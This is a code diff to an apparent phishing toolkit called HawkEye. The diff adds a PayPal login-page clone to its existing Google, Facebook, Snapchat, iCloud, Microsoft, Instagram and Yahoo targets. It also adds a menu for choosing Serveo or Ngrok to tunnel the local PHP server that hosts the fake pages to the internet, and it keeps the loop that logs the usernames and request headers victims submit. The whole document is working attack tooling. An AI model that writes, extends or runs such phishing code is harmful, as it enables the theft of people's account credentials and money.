@@ -1,10 +1,10 @@
-import multiprocessing
-import pathlib
+import multiprocessing, pathlib, json
 from collections import Counter
 from subprocess import call
 from shlex import split
 from distutils.dir_util import copy_tree
 from exts.ngrok import Ngrok
+from exts.serveo import Serveo
 
 YELLOW, MAGENTA, BLUE, RED, WHITE, CYAN, GREEN, DEFAULT  = '\033[93m', '\033[35m', '\u001b[34;1m' , '\033[1;91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'
 class HawkEye(object):
@@ -12,13 +12,14 @@ class HawkEye(object):
     def __init__(self):
 
         self.select_arrow = f'{BLUE}⮞{DEFAULT} '
-        
+
         print('Importing Ngrok Extension...')
         self.ngrok_app = Ngrok()
         print('Checking Ngrok Installation...')
         if not bool(self.ngrok_app.installed): 
             print('No Ngrok installation detected, installing...')
             self.ngrok_app.install_ngrok()
+        self.serveo_app = Serveo()
 
         self.web_paths = {
             'Google': [
@@ -31,10 +32,10 @@ class HawkEye(object):
                 'Instagram_web',
                 'Instagram_advanced_attack',
                 'Instagram_autoliker'
-            ]
+            ],
+            'Paypal': ['paypal']
         }
 
-        
         self.attack_vectors = (
             'Facebook',
             'Snapchat',
@@ -42,7 +43,8 @@ class HawkEye(object):
             'iCloud',
             'Microsoft',
             'Instagram',
-            'Yahoo'
+            'Yahoo',
+            'Paypal'
         )
 
     def generate_menu(self):
@@ -72,8 +74,9 @@ class HawkEye(object):
                 if(isinstance(attack_resp, int)) and attack_resp < len(self.attack_vectors): break
                 print("Must be a listed option")
 
-            except ValueError as e:
-                print('Value must be an integer!')
+            except ValueError as e: print('Value must be an integer!')
+
+            except KeyboardInterrupt: print(f"\n{RED}{self.quotes[0]}{DEFAULT}"); exit()
 
         try:
             custom_option = self.load_attack(self.attack_vectors[attack_resp])
@@ -130,6 +133,12 @@ class HawkEye(object):
         return 0
 
     def run_phishing(self, page, option, redirect_url):
+        
+        host_forwarders = {
+            0: ['ngrok', self.ngrok_app],
+            1: ['serveo', self.serveo_app]
+        }
+
         server_path = str(pathlib.Path('Server/www/').absolute())
         pages_path = str(pathlib.Path('WebPages').absolute())
         page_path = (pathlib.Path('WebPages') / self.web_paths[page][option])
@@ -151,9 +160,20 @@ class HawkEye(object):
 
         port_num = 1337
 
-        import pdb; pdb.set_trace(header='Testing Serveo Module')
+        #import pdb; pdb.set_trace(header='Service selector')
+        print('Choose Host Forwarder:\n')
 
-        with self.ngrok_app.run_ngrok(port_num) as url:
+        for i, provider in enumerate(host_forwarders.items()):
+            print(f'[{BLUE}{i}{DEFAULT}] {provider[1][0].capitalize()} Tunneler')
+        
+        while(True):
+            try:
+                forwarder_selection = int(input(f'\nUser Selection {self.select_arrow} '))
+                if(isinstance, int) and forwarder_selection < len(host_forwarders.items()): break
+                print('Not a valid selction')
+            except ValueError: print('Must be integer')
+
+        with host_forwarders[forwarder_selection][1].run(port_num) as url:
 
             print(f'URL of Interest: [{BLUE}{url}{DEFAULT}]')
 
@@ -175,8 +195,8 @@ class HawkEye(object):
             call(f'cd Server/www && php -S 127.0.0.1:{port_num} > /dev/null 2>&1 &', shell=True)
 
             log_cnt = Counter({
-                    'usernames': 0
-                })
+                'usernames': 0
+            })
             
             while True:
 
@@ -212,13 +232,11 @@ class HawkEye(object):
                             else:
                                 #print(data_blob[-1].strip())
                                 header_targets[key] = data_blob[-1].strip().split(' ')
-                                print(header_targets[key])
+                                #print(header_targets[key])
                                 header_targets[key][1:] = [' '.join(header_targets[key][1:])]
-                            print(f'[{BLUE}{header_targets[key][0]}{DEFAULT}]: {header_targets[key][1]}')
-                                
+                            print(f'[{BLUE}{header_targets[key][0]}{DEFAULT}]: {header_targets[key][1]}')                  
                                 
                         log_cnt['headers'] += 1
-
                         #address = data_blob[log_cnt['headers']].split(' ')
                         #address[0:3] = [' '.join(address[0:3])]
                         #print(address)
